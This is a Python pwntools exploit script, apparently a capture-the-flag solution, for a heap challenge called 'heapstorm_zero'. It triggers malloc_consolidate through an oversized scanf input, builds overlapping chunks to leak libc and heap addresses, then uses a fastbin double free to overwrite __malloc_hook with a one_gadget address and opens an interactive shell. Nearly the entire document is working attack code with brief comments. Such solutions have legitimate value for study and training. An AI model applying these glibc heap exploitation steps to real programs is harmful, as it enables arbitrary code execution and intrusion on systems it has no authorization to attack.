from pwn import *

p=process('./heapstorm_zero')
elf=ELF('./libc64.so')
DEBUG=1

one_gadget=0x4526a

if DEBUG:
    context.log_level=True

sd=lambda x:p.send(x)
sl=lambda x:p.sendline(x)
sla=lambda a,x:p.sendlineafter(a,x)
rv=lambda x:p.recvuntil(x)

def add(size,content=''):
    sla('Choice:','1')
    sla('size:',str(size))
    sla('content:',content)
    
def view(index):
    sla('Choice:','2')
    sla('index:',str(index))

def dele(index):
    sla('Choice:','3')
    sla('index: ',str(index))

def scanf_consli():
    sla('Choice:','3'*0x500)

add(0x20)
for i in range(20):
    add(0x30)   # 1-20

dele(0)
for i in range(4,10):
    dele(i)

scanf_consli()

add(0x38,'a'*0x30+p64(0x120))   # 0
add(0x38,'a'*0x30+p32(0x40))    # 4
add(0x38)                       # 5
add(0x38)                       # 6
add(0x28)                       # 7
add(0x28)                       # 8

# use largebin malloc_consolidate
# to get smallbin
dele(7) # bypass unlink check
dele(4)
scanf_consli()
dele(10)
scanf_consli()

add(0x38)   # 4

# 5 fd and main_arena is overlapped
view(5)
rv('Content: ')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b78
log.info('libc base is :'+hex(libc_base))

add(0x38) # 7
add(0x38) # 9
add(0x28) # 10 alloc to the first address
add(0x28) # 21
# 7  and 5 is overlapped
# 9  and 6 is overlapped
# 21 and 8 is overlapped

#==========================
# just to leak chunk base
dele(11)
dele(5)
view(7)
rv('Content: ')
chunk_base=u64(p.recv(6)+2*'\x00')-0x2b0
log.info('chunk base is :'+hex(chunk_base))

add(0x38)
add(0x38)
# recover
#=========================
# use double free to write __malloc_hook
dele(5)
dele(11)
dele(7)

add(0x38,p64(0x30)) # 5
add(0x38)           # 7
add(0x38)           # 8

dele(8)
dele(10)
dele(21)

add(0x28,p64(libc_base+0x3c4b30))
add(0x28)
add(0x28)
add(0x28,p64(0)*3+p64(0x40))

dele(9)
dele(13)
dele(6)

add(0x38,p64(libc_base+0x3c4b50))
add(0x38)
add(0x38)
#add(0x38)
add(0x38,p64(0)*3+p64(libc_base+0x3c4b00)+p64(chunk_base+0x220)*3)

#gdb.attach(p)
add(0x38,p64(libc_base+one_gadget))
add(0x38,p64(libc_base+one_gadget))
add(0x38,p64(libc_base+one_gadget))

sla('Choice:','1')
sla('size:','2')
 
p.interactive()



